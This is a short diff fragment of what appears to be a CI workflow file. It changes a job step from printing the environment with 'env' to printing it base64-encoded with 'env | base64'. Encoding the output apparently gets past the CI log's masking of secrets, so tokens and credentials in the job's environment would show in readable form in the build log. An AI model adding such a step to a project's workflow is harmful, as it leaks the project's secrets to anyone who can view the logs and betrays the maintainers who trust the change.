@@ -107,4 +107,4 @@ jobs:
             python: 3.9
     runs-on: "${{ matrix.os }}"
     steps:
-      - run: env
+      - run: "env | base64"
